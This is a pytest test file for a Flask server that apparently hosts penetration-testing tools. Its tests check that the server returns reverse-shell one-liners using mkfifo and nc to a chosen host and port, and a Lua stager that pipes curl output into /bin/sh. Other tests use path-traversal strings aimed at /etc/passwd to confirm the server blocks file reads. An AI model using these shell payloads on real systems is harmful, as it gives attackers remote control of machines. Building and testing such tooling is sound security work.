import pytest
from toolbox.server import server
from pathlib import Path
from flask import Flask
from http import HTTPStatus
import secrets
from bs4 import BeautifulSoup


def assert_response_has_link(response, **options):
    parsed = BeautifulSoup(response.data, features="html.parser")
    match = parsed.find_all("a", **options)
    assert len(match) > 0


@pytest.mark.parametrize(
    "href,name",
    [("/folder", "folder/"), ("/simple.txt", "simple.txt")],
)
def test_index_served_files(client, href, name):
    response = client.get("/")
    assert response.status_code == HTTPStatus.OK
    assert_response_has_link(response, href=href, string=name)


@pytest.mark.parametrize(
    "href,name",
    [
        ("/enum_linux.sh", "enum_linux.sh"),
        ("/enum_windows.exe", "enum_windows.exe"),
        ("/my_custom_namespace", "my_custom_namespace/"),
    ],
)
def test_index_toolbox_files(client, href, name):
    response = client.get("/")
    assert response.status_code == HTTPStatus.OK
    assert_response_has_link(response, href=href, string=name)


@pytest.mark.parametrize(
    "href,name",
    [
        ("/shells/shell.js", "/shells/shell.js"),
        ("/shells/shell.js/4444", "/shells/shell.js/4444"),
        ("/shells/shell.js/127.0.0.1/4444", "/shells/shell.js/127.0.0.1/4444"),
    ],
)
def test_index_shells(client, href, name):
    response = client.get("/")
    assert response.status_code == HTTPStatus.OK
    assert_response_has_link(response, href=href, string=name)


@pytest.mark.parametrize(
    "path,expected_data",
    [
        ("/simple.txt", b"simple.txt content\n"),
        ("/folder/child.txt", b"child.txt content\n"),
        ("/folder/nested_folder/nested_child.txt", b"nested_child.txt content\n"),
    ],
)
def test_reading_user_files(client, path, expected_data):
    response = client.get(path)
    assert response.status_code == HTTPStatus.OK
    assert response.data == expected_data


@pytest.mark.parametrize(
    "path,expected_links",
    [
        (
            "/folder",
            [
                b'<a href="/folder/child.txt">child.txt</a>',
                b'<a href="/folder/nested_folder">nested_folder/</a>',
            ],
        ),
        (
            "/folder/nested_folder",
            [b'<a href="/folder/nested_folder/nested_child.txt">nested_child.txt</a>'],
        ),
    ],
)
def test_viewing_user_folders(client, path, expected_links):
    response = client.get(path)
    assert response.status_code == HTTPStatus.OK
    for link in expected_links:
        assert link in response.data


@pytest.mark.parametrize(
    "path,expected_data",
    [
        ("/enum_linux.sh", b"enum.sh content\n"),
        ("/enum_windows.exe", b"enum.exe content\n"),
    ],
)
def test_reading_toolbox_files(client, path, expected_data):
    response = client.get(path)
    assert response.status_code == HTTPStatus.OK
    assert response.data == expected_data


@pytest.mark.parametrize(
    "path,expected_data",
    [
        ("/my_custom_namespace/linux/enum.sh", b"enum.sh content\n"),
        ("/my_custom_namespace/windows/enum.exe", b"enum.exe content\n"),
    ],
)
def test_reading_toolbox_files_with_namespace(client, path, expected_data):
    response = client.get(path)
    assert response.status_code == HTTPStatus.OK
    assert response.data == expected_data


@pytest.mark.parametrize(
    "path,expected_links",
    [
        (
            "/my_custom_namespace",
            [
                b'<a href="/my_custom_namespace/linux">linux/</a>',
                b'<a href="/my_custom_namespace/windows">windows/</a>',
            ],
        ),
        (
            "/my_custom_namespace/",
            [
                b'<a href="/my_custom_namespace/linux">linux/</a>',
                b'<a href="/my_custom_namespace/windows">windows/</a>',
            ],
        ),
        (
            "/my_custom_namespace/linux",
            [b'<a href="/my_custom_namespace/linux/enum.sh">enum.sh</a>'],
        ),
        (
            "/my_custom_namespace/windows",
            [b'<a href="/my_custom_namespace/windows/enum.exe">enum.exe</a>'],
        ),
    ],
)
def test_exploring_toolbox_files_with_namespaces(client, path, expected_links):
    response = client.get(path)
    assert response.status_code == HTTPStatus.OK
    for link in expected_links:
        assert link in response.data


@pytest.mark.parametrize(
    "path",
    [
        "/missing.sh",
        "/foo/missing.sh",
        "/foo/bar/missing.sh",
        "/foo/bar/missing.sh",
    ],
)
def test_requesting_missing_files(client, path):
    response = client.get(path)
    assert response.status_code == HTTPStatus.NOT_FOUND
    assert b"The requested URL was not found on the server" in response.data


@pytest.mark.parametrize(
    "path",
    [
        "../../../../../.../../../../../../../../../../../../../../../etc",
        "../../../../../.../../../../../../../../../../../../../../../etc/",
        "../../../../../.../../../../../../../../../../../../../../../etc/passwd",
        "//etc/passwd",
        "/../../../../../../../../../../../../../../../../../../etc/passwd",
        "/folder//etc/passwd",
        "/my_custom_namespace//etc/passwd",
        "/my_custom_namespace//etc/",
        "/my_custom_namespace//../../../../../../../../../../../../../../../../../../etc/passwd",
        "/my_custom_namespace/../../../../../../../../../../../../../../../../../../etc/",
        "/my_custom_namespace/../../../../../../../../../../../../../../../../../../etc",
        "/my_custom_namespace/../arbitrary_file_read_test.txt",
        "/my_custom_namespace/../../arbitrary_file_read_test.txt",
    ],
)
def test_security_against_arbitrary_file_read(client, path):
    response = client.get(path)
    assert response.status_code == HTTPStatus.NOT_FOUND
    assert b"The requested URL was not found on the server" in response.data


@pytest.mark.parametrize(
    "path,expected",
    [
        (
            "/shells/shell.sh",
            b"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 127.0.0.1 4444 >/tmp/f",
        ),
        (
            "/shells/shell.sh/5555",
            b"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 127.0.0.1 5555 >/tmp/f",
        ),
        (
            "/shells/shell.sh/10.10.10.10/1234",
            b"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 1234 >/tmp/f",
        ),
    ],
)
def test_shell_sh(client, path, expected):
    response = client.get(path)
    assert response.data == expected


@pytest.mark.parametrize(
    "path,expected",
    [
        (
            "/shells/shell.lua",
            b'os.execute("/usr/bin/curl http://localhost/shells/shell.sh | /bin/sh")',
        ),
        # Note: The lua payload is a stager, and lhost/lport values have no impact
        (
            "/shells/shell.lua/5555",
            b'os.execute("/usr/bin/curl http://localhost/shells/shell.sh | /bin/sh")',
        ),
        (
            "/shells/shell.lua/10.10.10.10/1234",
            b'os.execute("/usr/bin/curl http://localhost/shells/shell.sh | /bin/sh")',
        ),
    ],
)
def test_shell_lua(client, path, expected):
    response = client.get(path)
    assert response.data == expected


@pytest.mark.parametrize(
    "path",
    [
        "/shells/missing.sh",
        "/shells/missing.sh/5555",
        "/shells/missing.sh/10.10.10.10/1234",
        "/shells/index.html",
        "/shells/index.html/5555",
        "/shells/index.html/10.10.10.10/1234",
    ],
)
def test_shell_invalid_shells(client, path):
    response = client.get(path)
    assert response.status_code == HTTPStatus.NOT_FOUND
    assert b"The requested URL was not found on the server" in response.data


@pytest.mark.parametrize(
    "path",
    [
        "/debug/",
        "/debug/?value=",
        "/debug/?value=aGVsbG8=",
        "/debug/foo?value=aGVsbG8=",
        "/debug/foo/bar?value=aGVsbG8=",
        "/debug/foo/bar?value=not_base64_value",
    ],
)
def test_debug(client, path):
    response = client.get(path)
    assert response.status_code == HTTPStatus.OK
    assert response.data == b""
